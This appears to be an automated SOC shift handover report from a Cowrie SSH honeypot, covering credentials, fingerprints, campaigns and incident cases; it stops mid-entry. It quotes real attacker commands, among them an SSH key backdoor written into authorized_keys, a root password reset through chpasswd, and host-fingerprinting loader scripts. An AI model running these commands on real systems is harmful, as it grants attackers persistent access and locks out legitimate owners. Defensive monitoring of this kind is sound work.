# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-10-23 |
| **Generated At** | 2026-10-23T16:07:30Z |
| **Shift Time** | 16:07 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **405** |
| Confirmed Threats | **344** |
| False Positives Filtered | **61** (15.1%) |
| Unique Attacker IPs | **242** |
| Countries of Origin | **47** |
| High Severity Cases | **219** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **186** |
| Malware Samples Analyzed | **7** HIGH · **25** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **4134** |
| Unique Credential Pairs | **1861** |
| Unique Usernames | **687** |
| Unique Passwords | **1323** |
| Successful Auth Pairs | **3369** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 1261 |
| `ubuntu` | 227 |
| `admin` | 123 |
| `345gs5662d34` | 111 |
| `user` | 79 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 195 |
| `3245gs5662d34` | 113 |
| `345gs5662d34` | 111 |
| `123` | 92 |
| `1234` | 68 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 111 |
| `root` | `3245gs5662d34` | 92 |
| `support` | `support` | 28 |
| `admin` | `admin` | 20 |
| `root` | `123456` | 13 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `root0000` | `195.178.110.227` | 2026-10-23T00:55:04 |
| `postgres` | `postgres` | `195.178.110.218` | 2026-10-23T00:55:18 |
| `nagios` | `nagions` | `195.178.110.218` | 2026-10-23T00:55:37 |
| `root` | `aaa12345!` | `116.123.150.231` | 2026-10-23T00:55:39 |
| `345gs5662d34` | `345gs5662d34` | `116.123.150.231` | 2026-10-23T00:55:43 |
| `root` | `3245gs5662d34` | `116.123.150.231` | 2026-10-23T00:55:44 |
| `root` | `nsroot` | `195.178.110.218` | 2026-10-23T00:55:57 |
| `ibm` | `ibm` | `195.178.110.218` | 2026-10-23T00:56:17 |
| `ibmuser` | `ibmuser` | `195.178.110.218` | 2026-10-23T00:56:37 |
| `ibmadmin` | `ibmadmin` | `195.178.110.218` | 2026-10-23T00:56:57 |
| `team` | `team` | `195.178.110.218` | 2026-10-23T00:57:18 |
| `cowork` | `cowork` | `195.178.110.218` | 2026-10-23T00:57:39 |
| `root` | `root1111` | `195.178.110.227` | 2026-10-23T00:57:54 |
| `caleb` | `caleb` | `195.178.110.218` | 2026-10-23T00:58:00 |
| `layer` | `layer` | `195.178.110.218` | 2026-10-23T00:58:22 |
| `super` | `super` | `195.178.110.218` | 2026-10-23T00:58:44 |
| `support` | `support` | `10.0.0.73` | 2026-10-23T00:59:03 |
| `kubernetes` | `kubernetes` | `195.178.110.218` | 2026-10-23T00:59:06 |
| `rpm` | `rpm123` | `195.178.110.218` | 2026-10-23T00:59:27 |
| `rpm` | `Rpm` | `195.178.110.218` | 2026-10-23T00:59:48 |
_… 3349 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **405** |
| Sessions with Fingerprint | **33** |
| Unique HASSH Fingerprints | **33** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 180 |
| Go SSH scanner | 46 |
| OpenSSH | 9 |
| Unknown | 6 |
| Paramiko (Python) | 5 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 135 | 69 |
| `16443846184e...` | Generic scanner | 14 | 5 |
| `03a80b21afa8...` | Modern SSH client | 11 | 5 |
| `2ec37a7cc8da...` | Mirai/variant | 10 | 4 |
| `eff4c24daffc...` | Modern SSH client | 7 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 135 | 69 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 14 | 5 | Generic scanner |
| `95420f9d932d...` | libssh | 12 | 12 | — |
| `03a80b21afa8...` | libssh | 11 | 5 | Modern SSH client |
| `2ec37a7cc8da...` | Go SSH scanner | 10 | 4 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 7 | 1 | Modern SSH client |
| `af8223ac9914...` | libssh | 7 | 4 | libssh-based |
| `390ffe68a68c...` | OpenSSH | 6 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **20** |
| Campaign Clusters | **4** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **Recon Loader Script** | 🟡 MEDIUM | 138 | 4 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 72 | 70 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:JxQ00m5fcBnt"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `49.248.250.122`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.49`, `2.57.122.209`, `92.118.39.71`, `195.178.110.227`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `176.65.132.132`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **242** |
| Unique ASNs | **104** |
| High-Risk ASNs | **78** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 71 | HIGH |
| `AS396982` | Google LLC | 12 | HIGH |
| `AS8075` | Microsoft Corporation | 10 | HIGH |
| `AS213412` | ONYPHE SAS | 9 | LOW |
| `AS14061` | DigitalOcean, LLC | 8 | HIGH |
| `AS4766` | Korea Telecom | 5 | HIGH |
| `AS4134` | CHINANET BACKBONE | 5 | HIGH |
| `AS6939` | Hurricane Electric LLC | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (210)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-dadaf91fcbf3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-10-23 00:55 |
| **Last Seen** | 2026-10-23 00:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 00:55:04` | `cowrie.session.connect` |
| `2026-10-23 00:55:04` | `cowrie.client.version` |
| `2026-10-23 00:55:04` | `cowrie.client.kex` |
| `2026-10-23 00:55:04` | `cowrie.login.success` |
| `2026-10-23 00:55:06` | `cowrie.session.params` |
| `2026-10-23 00:55:06` | `cowrie.command.input` |
| `2026-10-23 00:55:06` | `cowrie.command.input` |
| `2026-10-23 00:55:06` | `cowrie.command.input` |
| `2026-10-23 00:55:06` | `cowrie.command.input` |
| `2026-10-23 00:55:06` | `cowrie.command.input` |
| `2026-10-23 00:55:06` | `cowrie.command.success` |
| `2026-10-23 00:55:06` | `cowrie.command.input` |
| `2026-10-23 00:55:06` | `cowrie.command.input` |
| `2026-10-23 00:55:06` | `cowrie.command.input` |
| `2026-10-23 00:55:06` | `cowrie.command.input` |
| … | _5 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82d253fbecd0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-10-23 00:55 |
| **Last Seen** | 2026-10-23 00:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 00:55:18` | `cowrie.session.connect` |
| `2026-10-23 00:55:18` | `cowrie.client.version` |
| `2026-10-23 00:55:18` | `cowrie.client.kex` |
| `2026-10-23 00:55:18` | `cowrie.login.success` |
| `2026-10-23 00:55:19` | `cowrie.session.params` |
| `2026-10-23 00:55:19` | `cowrie.command.input` |
| `2026-10-23 00:55:19` | `cowrie.log.closed` |
| `2026-10-23 00:55:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c992a5fa2dad

| Field | Detail |
|---|---|
| **Source IP** | `116.123.150[.]231` |
| **First Seen** | 2026-10-23 00:55 |
| **Last Seen** | 2026-10-23 00:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 00:55:38` | `cowrie.session.connect` |
| `2026-10-23 00:55:38` | `cowrie.client.version` |
| `2026-10-23 00:55:38` | `cowrie.client.kex` |
| `2026-10-23 00:55:39` | `cowrie.login.success` |
| `2026-10-23 00:55:40` | `cowrie.session.params` |
| `2026-10-23 00:55:40` | `cowrie.command.input` |
| `2026-10-23 00:55:40` | `cowrie.command.failed` |
| `2026-10-23 00:55:40` | `cowrie.log.closed` |
| `2026-10-23 00:55:41` | `cowrie.session.params` |
| `2026-10-23 00:55:41` | `cowrie.command.input` |
| `2026-10-23 00:55:41` | `cowrie.session.file_download` |
| `2026-10-23 00:55:41` | `cowrie.log.closed` |
| `2026-10-23 00:55:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.123.150[.]231` to AbuseIPDB if not already reported
- [ ] Block `116.123.150[.]231` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c241954255b

| Field | Detail |
|---|---|
| **Source IP** | `116.123.150[.]231` |
| **First Seen** | 2026-10-23 00:55 |
| **Last Seen** | 2026-10-23 00:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 00:55:42` | `cowrie.session.connect` |
| `2026-10-23 00:55:42` | `cowrie.client.version` |
| `2026-10-23 00:55:42` | `cowrie.client.kex` |
| `2026-10-23 00:55:43` | `cowrie.login.success` |
| `2026-10-23 00:55:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.123.150[.]231` to AbuseIPDB if not already reported
- [ ] Block `116.123.150[.]231` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b7c2cdc54e1

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]234` |
| **First Seen** | 2026-10-23 01:04 |
| **Last Seen** | 2026-10-23 01:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 01:04:41` | `cowrie.session.connect` |
| `2026-10-23 01:04:42` | `cowrie.client.version` |
| `2026-10-23 01:04:42` | `cowrie.client.kex` |
| `2026-10-23 01:04:42` | `cowrie.login.success` |
| `2026-10-23 01:04:43` | `cowrie.direct-tcpip.request` |
| `2026-10-23 01:04:43` | `cowrie.direct-tcpip.data` |
| `2026-10-23 01:04:43` | `cowrie.direct-tcpip.request` |
| `2026-10-23 01:04:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]234` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3bdb792ec7b

| Field | Detail |
|---|---|
| **Source IP** | `80.94.95[.]116` |
| **First Seen** | 2026-10-23 01:08 |
| **Last Seen** | 2026-10-23 01:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 01:08:38` | `cowrie.session.connect` |
| `2026-10-23 01:08:39` | `cowrie.client.version` |
| `2026-10-23 01:08:39` | `cowrie.client.kex` |
| `2026-10-23 01:08:40` | `cowrie.login.success` |
| `2026-10-23 01:08:40` | `cowrie.direct-tcpip.request` |
| `2026-10-23 01:08:41` | `cowrie.direct-tcpip.data` |
| `2026-10-23 01:08:41` | `cowrie.direct-tcpip.request` |
| `2026-10-23 01:08:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.95[.]116` to AbuseIPDB if not already reported
- [ ] Block `80.94.95[.]116` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2ebeae962db

| Field | Detail |
|---|---|
| **Source IP** | `80.94.95[.]115` |
| **First Seen** | 2026-10-23 01:23 |
| **Last Seen** | 2026-10-23 01:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 01:23:42` | `cowrie.session.connect` |
| `2026-10-23 01:23:42` | `cowrie.client.version` |
| `2026-10-23 01:23:42` | `cowrie.client.kex` |
| `2026-10-23 01:23:43` | `cowrie.login.success` |
| `2026-10-23 01:23:43` | `cowrie.direct-tcpip.request` |
| `2026-10-23 01:23:43` | `cowrie.direct-tcpip.data` |
| `2026-10-23 01:23:43` | `cowrie.direct-tcpip.request` |
| `2026-10-23 01:23:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.95[.]115` to AbuseIPDB if not already reported
- [ ] Block `80.94.95[.]115` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb42a0a31ce4

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-10-23 01:39 |
| **Last Seen** | 2026-10-23 01:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 01:39:30` | `cowrie.session.connect` |
| `2026-10-23 01:39:30` | `cowrie.client.version` |
| `2026-10-23 01:39:30` | `cowrie.client.kex` |
| `2026-10-23 01:39:31` | `cowrie.login.success` |
| `2026-10-23 01:39:31` | `cowrie.direct-tcpip.request` |
| `2026-10-23 01:39:31` | `cowrie.direct-tcpip.data` |
| `2026-10-23 01:39:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03e9bc8cdedf

| Field | Detail |
|---|---|
| **Source IP** | `222.99.31[.]54` |
| **First Seen** | 2026-10-23 01:47 |
| **Last Seen** | 2026-10-23 01:48 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 01:47:52` | `cowrie.session.connect` |
| `2026-10-23 01:47:53` | `cowrie.login.success` |
| `2026-10-23 01:47:53` | `cowrie.session.params` |
| `2026-10-23 01:47:54` | `cowrie.command.input` |
| `2026-10-23 01:47:54` | `cowrie.command.failed` |
| `2026-10-23 01:47:54` | `cowrie.command.input` |
| `2026-10-23 01:47:54` | `cowrie.command.failed` |
| `2026-10-23 01:47:54` | `cowrie.command.input` |
| `2026-10-23 01:47:54` | `cowrie.command.failed` |
| `2026-10-23 01:47:55` | `cowrie.command.input` |
| `2026-10-23 01:47:55` | `cowrie.command.failed` |
| `2026-10-23 01:47:55` | `cowrie.command.input` |
| `2026-10-23 01:47:55` | `cowrie.command.input` |
| `2026-10-23 01:47:55` | `cowrie.command.failed` |
| `2026-10-23 01:47:55` | `cowrie.command.failed` |
| … | _2 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `222.99.31[.]54` to AbuseIPDB if not already reported
- [ ] Block `222.99.31[.]54` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1d1a3ef1148

| Field | Detail |
|---|---|
| **Source IP** | `222.99.31[.]54` |
| **First Seen** | 2026-10-23 01:49 |
| **Last Seen** | 2026-10-23 01:49 |
| **Session Duration** | 34s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 01:49:00` | `cowrie.session.connect` |
| `2026-10-23 01:49:01` | `cowrie.login.success` |
| `2026-10-23 01:49:02` | `cowrie.login.success` |
| `2026-10-23 01:49:02` | `cowrie.session.params` |
| `2026-10-23 01:49:03` | `cowrie.command.input` |
| `2026-10-23 01:49:03` | `cowrie.command.failed` |
| `2026-10-23 01:49:03` | `cowrie.command.input` |
| `2026-10-23 01:49:03` | `cowrie.command.failed` |
| `2026-10-23 01:49:03` | `cowrie.command.input` |
| `2026-10-23 01:49:03` | `cowrie.command.input` |
| `2026-10-23 01:49:03` | `cowrie.command.failed` |
| `2026-10-23 01:49:03` | `cowrie.command.failed` |
| `2026-10-23 01:49:35` | `cowrie.log.closed` |
| `2026-10-23 01:49:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.99.31[.]54` to AbuseIPDB if not already reported
- [ ] Block `222.99.31[.]54` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-399d035b41b1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]218` |
| **First Seen** | 2026-10-23 02:00 |
| **Last Seen** | 2026-10-23 02:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 02:00:38` | `cowrie.session.connect` |
| `2026-10-23 02:00:38` | `cowrie.client.version` |
| `2026-10-23 02:00:38` | `cowrie.client.kex` |
| `2026-10-23 02:00:39` | `cowrie.login.success` |
| `2026-10-23 02:00:39` | `cowrie.session.params` |
| `2026-10-23 02:00:39` | `cowrie.command.input` |
| `2026-10-23 02:00:39` | `cowrie.log.closed` |
| `2026-10-23 02:00:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]218` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa6d7ce9adc0

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-10-23 02:06 |
| **Last Seen** | 2026-10-23 02:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 02:06:24` | `cowrie.session.connect` |
| `2026-10-23 02:06:24` | `cowrie.client.version` |
| `2026-10-23 02:06:24` | `cowrie.client.kex` |
| `2026-10-23 02:06:25` | `cowrie.login.success` |
| `2026-10-23 02:06:25` | `cowrie.direct-tcpip.request` |
| `2026-10-23 02:06:25` | `cowrie.direct-tcpip.data` |
| `2026-10-23 02:06:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-885342de5f50

| Field | Detail |
|---|---|
| **Source IP** | `80.94.95[.]118` |
| **First Seen** | 2026-10-23 02:13 |
| **Last Seen** | 2026-10-23 02:13 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 02:13:04` | `cowrie.session.connect` |
| `2026-10-23 02:13:04` | `cowrie.client.version` |
| `2026-10-23 02:13:04` | `cowrie.client.kex` |
| `2026-10-23 02:13:04` | `cowrie.login.success` |
| `2026-10-23 02:13:08` | `cowrie.direct-tcpip.request` |
| `2026-10-23 02:13:08` | `cowrie.direct-tcpip.ja4` |
| `2026-10-23 02:13:08` | `cowrie.direct-tcpip.data` |
| `2026-10-23 02:13:11` | `cowrie.direct-tcpip.request` |
| `2026-10-23 02:13:14` | `cowrie.direct-tcpip.ja4` |
| `2026-10-23 02:13:14` | `cowrie.direct-tcpip.data` |
| `2026-10-23 02:13:19` | `cowrie.direct-tcpip.request` |
| `2026-10-23 02:13:22` | `cowrie.direct-tcpip.ja4` |
| `2026-10-23 02:13:22` | `cowrie.direct-tcpip.data` |
| `2026-10-23 02:13:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.95[.]118` to AbuseIPDB if not already reported
- [ ] Block `80.94.95[.]118` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93ba03121de4

| Field | Detail |
|---|---|
| **Source IP** | `36.41.173[.]197` |
| **First Seen** | 2026-10-23 02:26 |
| **Last Seen** | 2026-10-23 02:30 |
| **Session Duration** | 254s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-23 02:26:40` | `cowrie.session.connect` |
| `2026-10-23 02:26:40` | `cowrie.client.version` |
| `2026-10-23 02:26:40` | `cowrie.client.kex` |
| `2026-10-23 02:26:41` | `cowrie.login.success` |
| `2026-10-23 02:26:42` | `cowrie.session.params` |
| `2026-10-23 02:26:42` | `cowrie.command.input` |
| `2026-10-23 02:26:42` | `cowrie.command.failed` |
| `2026-10-23 02:30:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.41.173[.]197` to AbuseIPDB if not already reported
- [ ] Block `36.41.173[.]197` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac242644bb50

| Field | Detail |
|---|---|
| **Source IP** | `166.1.237[.]197` |
| **First Seen** | 2026-10-23 02:48 |
